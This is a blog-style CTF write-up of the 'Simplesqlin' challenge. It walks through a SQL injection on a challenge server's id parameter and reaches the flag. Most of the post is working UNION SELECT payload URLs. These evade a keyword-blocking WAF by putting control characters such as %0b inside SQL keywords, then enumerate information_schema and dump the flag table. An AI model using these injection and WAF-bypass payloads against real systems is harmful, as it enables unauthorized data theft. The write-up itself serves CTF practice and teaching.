---
layout: post
title: Simplesqlin
date: '2017-03-01'
author: Hland
tags:
- CTF
- SQLi
---

The server runs `openresty/1.11.2.2` according to the response headers. 

Injection point is here:
`http://202.120.7.203/index.php?id=1*`

We can add or subtract or multiply numbers..

`http://202.120.7.203/index.php?id=2-1`
`http://202.120.7.203/index.php?id=2%2b1`
`http://202.120.7.203/index.php?id=2*1`


By doing `order by` we find the column number, which is 3. `order by 4` gives a 500 error:

`http://202.120.7.203/index.php?id=1%20order%20by%203--+`


Anything else so far results in 500 errors.
There is a WAF blocking certain keywords. List of blocked keywords:
* `SELECT`
* `FROM`
* `WHERE`
* `SLEEP`


We can bypass the WAF by inserting a control character inside the keywords. Here we used `%0b` which is vertical tabulation.

`http://202.120.7.203/index.php?id=2 uni%0bon+se%0blect 1,"a",3 order by 1--+`

Other control characters that work in this case are:
* `%0c`
* `%0E`
* `%0F`
* `%10 - %1f`

So the WAF is relatively easily bypassed.

Now we need to find the table in which the flag is stored. Because I suck at remembering Mysql special tables and such I used a resource like this:

[MySQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

Then we do a query like this:

```
http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect table_schema,table_name,1 FR%0bOM information_schema.tables WHE%0bRE table_schema != 'mysql' AND table_schema != 'information_schema' order by 3--+
```

To find that there is a table called `flag`, duh.

And we can also get the column name in a similar fashion:

```
http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect table_schema,table_name,column_name FR%0bOM information_schema.columns WHE%0bRE table_schema != 'mysql' AND table_schema != 'information_schema' order by 3 LIMIT 1 OFFSET 1--+
```


And then finally we can get the flag by doing this query:

```
http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect flag,1,2 FR%0bOM flag order by 3--+
```


```
flag{W4f_bY_paSS_f0R_CI}
```